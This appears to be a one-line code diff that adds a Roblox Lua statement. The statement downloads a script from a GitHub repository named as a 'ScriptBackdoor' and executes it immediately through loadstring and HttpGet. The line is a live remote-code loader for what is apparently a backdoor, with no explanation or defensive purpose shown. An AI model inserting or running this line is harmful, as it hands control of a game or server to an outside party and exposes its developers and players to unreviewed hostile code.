@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/c00lhaxOFFICAL/KRGNScriptBackdoor/refs/heads/main/KRGNOfficial"))()
